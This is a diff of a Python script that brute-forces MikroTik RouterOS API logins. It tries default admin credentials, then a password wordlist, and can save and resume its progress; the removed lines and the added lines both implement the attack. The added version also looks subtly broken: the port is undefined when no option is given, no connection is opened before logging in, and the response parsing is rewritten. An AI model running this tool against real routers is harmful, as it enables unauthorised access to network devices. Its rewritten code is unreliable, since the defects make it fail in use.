@@ -14,7 +14,7 @@ from _log import Log
 # Constants - Define defaults
 USE_SSL = False
 TARGET = None
-PORT = None
+PORT = 8728  # Default port
 SSL_PORT = 8729
 USER = None
 PASSWORD = None
@@ -88,7 +88,7 @@ def signal_handler(signal, frame):
 
 class ApiRos:
     '''Modified class from official RouterOS API'''
-    def __init__(self, sk, target, user, password, use_ssl=USE_SSL, port=8728,
+    def __init__(self, sk, target, user, password, port, use_ssl=USE_SSL,
                  verbose=VERBOSE, context=CONTEXT):
 
         self.target = target
@@ -102,14 +102,6 @@ class ApiRos:
         
         self.sk = sk
         self.currenttag = 0
-
-        # Port setting logic
-        if port:
-            self.port = port
-        elif use_ssl:
-            self.port = SSL_PORT
-        else:
-            self.port = PORT
 
          # Create Log instance to save or print verbose logs
         sys.log = Log(verbose, VERBOSE_LOGIC, VERBOSE_FILE_MODE)
@@ -199,302 +191,145 @@ class ApiRos:
                 self.sock.sendall(b'\xF0')
             else:
                 raise WordTooLong('Word is too long. Max length of word is 4294967295.')
-            self.sock.sendall(length_to_send.to_bytes(num_of_bytes, byteorder='big'))
+            self.sock.sendall(length_to_send.to_bytes(num_of_bytes, 'big'))
+            sys.log('Sent length {}'.format(length_to_send.to_bytes(num_of_bytes, 'big')))
 
-            # Actually I haven't successfully sent words larger than approx. 65520.
-            # Probably it is some RouterOS limitation of 2^16.
+        for sentence in sentence_to_send:
+            send_length(sentence)
+            self.sock.sendall(sentence.encode('utf-8'))
+            sys.log('Sent sentence {}'.format(sentence))
 
-        # The same logic applies for receiving word length from RouterOS side.
-        # See RouterOS API Wiki for more info.
-        def receive_length():
-            r = self.sock.recv(1)  # Receive the first byte of word length
+        self.sock.sendall(b'\x00')
 
-            # If the first byte of word is smaller than 80 (base 16),
-            # then we already received the whole length and can return it.
-            # Otherwise if it is larger, then word size is encoded in multiple bytes and we must receive them all to
-            # get the whole word size.
+        # Now receiving answer and passing to output
+        response = []
+        while True:
+            word = self.receive_length()
+            if word == '':
+                break
+            response.append(word)
 
-            if r < b'\x80':
-                r = int.from_bytes(r, byteorder='big')
-            elif r < b'\xc0':
-                r += self.sock.recv(1)
-                r = int.from_bytes(r, byteorder='big')
-                r -= 0x8000
-            elif r < b'\xe0':
-                r += self.sock.recv(2)
-                r = int.from_bytes(r, byteorder='big')
-                r -= 0xC00000
-            elif r < b'\xf0':
-                r += self.sock.recv(3)
-                r = int.from_bytes(r, byteorder='big')
-                r -= 0xE0000000
-            elif r == b'\xf0':
-                r = self.sock.recv(4)
-                r = int.from_bytes(r, byteorder='big')
-            return r
+        return response
 
-        def read_sentence():
-            rcv_sentence = []  # Words will be appended here
-            rcv_length = receive_length()  # Get the size of the word
-
-            while rcv_length != 0:
-                received = b''
-                while rcv_length > len(received):
-                    rec = self.sock.recv(rcv_length - len(received))
-                    if rec == b'':
-                        raise RuntimeError('socket connection broken')
-                    received += rec
-                received = received.decode('utf-8', 'backslashreplace')
-                sys.log('<<< {}'.format(received))
-                rcv_sentence.append(received)
-                rcv_length = receive_length()  # Get the size of the next word
-            return rcv_sentence
-
-        # Sending part of conversation
-
-        # Each word must be sent separately.
-        # First, length of the word must be sent,
-        # Then, the word itself.
-        for word in sentence_to_send:
-            send_length(word)
-            self.sock.sendall(word.encode('utf-8'))  # Sending the word
-            sys.log('>>> {}'.format(word))
-        self.sock.sendall(b'\x00')  # Send zero length word to mark end of the sentence
-
-        # Receiving part of the conversation
-
-        # Will continue receiving until receives '!done' or some kind of error (!trap).
-        # Everything will be appended to paragraph variable, and then returned.
-        paragraph = []
-        received_sentence = ['']
-        while received_sentence and received_sentence[0] != '!done':
-            received_sentence = read_sentence()
-            paragraph.append(received_sentence)
-        self.status = paragraph
-        self.close()
-        return paragraph
-        
-
-    # Initiate a conversation with the router
-    def talk(self, message):
-
-        # It is possible for message to be string, tuple or list containing multiple strings or tuples
-        if type(message) == str or type(message) == tuple:
-            return self.send(message)
-        elif type(message) == list:
-            reply = []
-            for sentence in message:
-                reply.append(self.send(sentence))
-            return reply
-        else:
-            raise TypeError('talk() argument must be str or tuple containing str or list containing str or tuples')
-
-    def send(self, sentence):
-        # If sentence is string, not tuples of strings, it must be divided in words
-        if type(sentence) == str:
-            sentence = sentence.split()
-        reply = self.communicate(sentence)
-
-        # If RouterOS returns error from command that was sent
-        if '!trap' in reply[0][0]:
-            # You can comment following line out if you don't want to raise an error in case of !trap
-            raise RouterOSTrapError("\nCommand: {}\nReturned an error: {}".format(sentence, reply))
+    def receive_length(self):
+        rcvlen = ord(self.sock.recv(1))
+        if rcvlen & 0x80 == 0x00:
             pass
+        elif rcvlen & 0xC0 == 0x80:
+            rcvlen &= ~0xC0
+            rcvlen <<= 8
+            rcvlen += ord(self.sock.recv(1))
+        elif rcvlen & 0xE0 == 0xC0:
+            rcvlen &= ~0xE0
+            rcvlen <<= 8
+            rcvlen += ord(self.sock.recv(1))
+            rcvlen <<= 8
+            rcvlen += ord(self.sock.recv(1))
+        elif rcvlen & 0xF0 == 0xE0:
+            rcvlen &= ~0xF0
+            rcvlen <<= 8
+            rcvlen += ord(self.sock.recv(1))
+            rcvlen <<= 8
+            rcvlen += ord(self.sock.recv(1))
+            rcvlen <<= 8
+            rcvlen += ord(self.sock.recv(1))
+        elif rcvlen & 0xF8 == 0xF0:
+            rcvlen = ord(self.sock.recv(1)) << 24
+            rcvlen += ord(self.sock.recv(1)) << 16
+            rcvlen += ord(self.sock.recv(1)) << 8
+            rcvlen += ord(self.sock.recv(1))
+        return self.sock.recv(rcvlen).decode('utf-8')
 
-        # reply is list containing strings with RAW output form API
-        # nice_reply is a list containing output form API sorted in dictionary for easier use later
-        nice_reply = []
-        for m in range(len(reply) - 1):
-            nice_reply.append({})
-            for k, v in (x[1:].split('=', 1) for x in reply[m][1:]):
-                nice_reply[m][k] = v
-        return nice_reply
-
-    def is_alive(self) -> bool:
-        """Check if socket is alive and router responds"""
-
-        # Check if socket is open in this end
-        try:
-            self.sock.settimeout(2)
-        except OSError:
-            sys.log("Socket is closed.")
-            return False
-
-        # Check if we can send and receive through socket
-        try:
-            self.talk('/system/identity/print')
-
-        except (socket.timeout, IndexError, BrokenPipeError):
-            sys.log("Router does not respond, closing socket.")
-            self.close()
-            return False
-
-        sys.log("Socket is open, router responds.")
-        self.sock.settimeout(None)
-        return True
-
+    # Tries to login using default (admin with blank password) credentials on RouterOS API
     def create_connection(self):
-        """Create API connection
-
-        1. Open socket
-        2. Log into router
-        """
         self.open_socket()
         self.login(self.user, self.password)
 
-    def close(self):
-        sys.log("API socket connection closed.")
+    def close_connection(self):
         self.sock.close()
+        sys.log('API socket connection closed.')
 
-def run(pwd_num):
-    run_time = "%.1f" % (time.time() - t)
-    status = "Elapsed Time: %s sec | Passwords Tried: %s" % (run_time, pwd_num)
-    bar = "_"*len(status)
-    print(bar)
-    print(status + "\n")
+def read_save_file(file):
+    with open(file, 'r') as f:
+        return json.load(f)
+
+def write_save_file(file, data):
+    with open(file, 'w') as f:
+        return json.dump(data, f)
 
 def main():
-    print(banner)
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:s:a:q", ["help", "target=", "port=", "user=", "dictionary=", "seconds=", "autosave=", "quiet"])
-    except getopt.GetoptError as err:
-        error(err)
-        sys.exit(2)
+        # Arguments are getting here
+        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:s:qa:", ["help", "target=", "port=", "user=", "dictionary=", "seconds=", "quiet", "autosave="])
 
-    if not opts:
-        error("ERROR: You must specify at least a Target and a Dictionary")
-        sys.exit(2)
+        target = None
+        user = "admin"
+        dictionary = None
+        seconds = 1
+        quiet = False
+        autosave = None
 
-    target = None
-    port = None
-    user = None
-    dictionary = None
-    quietmode = False
-    seconds = None
-    autosave_file = None
+        for opt, arg in opts:
+            if opt in ("-h", "--help"):
+                usage()
+                sys.exit()
+            elif opt in ("-t", "--target"):
+                target = arg
+            elif opt in ("-p", "--port"):
+                port = int(arg)  # Convert port argument to integer
+            elif opt in ("-u", "--user"):
+                user = arg
+            elif opt in ("-d", "--dictionary"):
+                dictionary = arg
+            elif opt in ("-s", "--seconds"):
+                seconds = int(arg)
+            elif opt in ("-q", "--quiet"):
+                quiet = True
+            elif opt in ("-a", "--autosave"):
+                autosave = arg
 
-    for opt, arg in opts:
-        if opt in ("-h", "--help"):
-            usage()
-            sys.exit(0)
-        elif opt in ("-t", "--target"):
-            target = arg
-        elif opt in ("-p", "--port"):
-            port = arg
-        elif opt in ("-u", "--user"):
-            user = arg
-        elif opt in ("-d", "--dictionary"):
-            dictionary = arg
-        elif opt in ("-s", "--seconds"):
-            seconds = arg
-        elif opt in ("-q", "--quiet"):
-            quietmode = True
-        elif opt in ("-a", "--autosave"):
-            autosave_file = arg
-        else:
-            assert False, "error"
+        if target is None or dictionary is None:
+            error("Target or Dictionary file was not specified")
             sys.exit(2)
 
-    if not target:
-        error("ERROR: You must specify a Target")
+        # Start brute force
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        api = ApiRos(sk, target, user, "", port)  # Pass port to ApiRos
+        
+        with open(dictionary, 'r') as f:
+            passwords = [line.strip() for line in f]
+
+        # If autosave file exists, load progress
+        if autosave and os.path.exists(autosave):
+            saved_data = read_save_file(autosave)
+            start_index = saved_data.get('last_attempted', 0)
+            passwords = passwords[start_index:]
+        else:
+            start_index = 0
+
+        for index, pwd in enumerate(passwords, start=start_index):
+            try:
+                sys.log("Trying password: {}".format(pwd))
+                api.login(user, pwd)
+                print("Password found: {}".format(pwd))
+                break
+            except LoginError as e:
+                if not quiet:
+                    print("Failed with password: {}".format(pwd))
+                time.sleep(seconds)
+                if autosave:
+                    write_save_file(autosave, {'last_attempted': index})
+            except CreateSocketError as e:
+                print(e)
+                break
+
+        api.close_connection()
+
+    except getopt.GetoptError as err:
+        error(str(err))
         sys.exit(2)
-    if not dictionary:
-        error("ERROR: You must specify a Dictionary")
-        sys.exit(2)
-    if not port:
-        port = 8728
-    if not user:
-        user = 'admin'
-    if not seconds:
-        seconds = 1
 
-    print("[*] Starting bruteforce attack...")
-    print("-" * 33)
-
-    # Catch KeyboardInterrupt
-    signal.signal(signal.SIGINT, signal_handler)
-    
-    # Looking for default RouterOS creds
-    defcredcheck = True
-
-    # Get the number of lines in file
-    count = 0
-    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
-    while 1:
-        buffer = dictFile.read(8192*1024)
-        if not buffer: break
-        count += buffer.count('\n')
-    dictFile.seek(0)
-
-    last_password = None
-    if autosave_file and os.path.isfile(autosave_file):
-      print("[*] Loading autosave data from file %s" % autosave_file)
-      with open(autosave_file) as autosave_json:
-        autosave_data = json.load(autosave_json)
-        last_password = autosave_data["last_password"]
-    
-    # Passwords iteration & socket creation
-    items = 1
-    for password in dictFile.readlines():
-        password = password.strip('\r\n')
-
-        # Rewind to autosaved password if it is defined
-        if last_password:
-            if password != last_password:
-                items += 1
-                continue
-            else:
-                last_password = None
-
-        # First of all, we'll try with RouterOS default credentials ("admin":"")
-        while defcredcheck:
-            s = None
-            apiros = ApiRos(s, target, "admin", "", port)
-            dictFile.close()
-            defaultcreds = apiros.status
-            login = ''.join(defaultcreds[0][0])
-
-            print("[-] Trying with default credentials on RouterOS...")
-            if login == "!done":
-                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
-                sys.exit(0)
-            else:
-                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
-                print("")
-                defcredcheck = False
-                time.sleep(1)
-
-        apiros = ApiRos(s, target, user, password, port)
-        loginoutput = apiros.status
-        login = ''.join(loginoutput[0][0])
-
-        if not quietmode:
-            print("[-] Trying " + str(items) + " of " + str(count) + " Passwords - Current: " + password)
-            apiros.close()
-
-        if login == "!done":
-            print("[+] Login successful!!! User: " + user + " Password: " + password)
-            run(items)
-            return
-        items +=1
-
-        if autosave_file and items % 20 == 0:
-            print("[*] Autosaving progress data to file %s" % autosave_file)
-            with open(autosave_file, "w") as autosave_json:
-                autosave_data = {
-                    "last_password": password
-                }
-                json.dump(autosave_data, autosave_json)
-
-        time.sleep(int(seconds))
-    
-    print()
-    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
-    run(count)
-
-if __name__ == '__main__':
-    t = time.time()
+if __name__ == "__main__":
     main()
-    sys.exit()
-
-
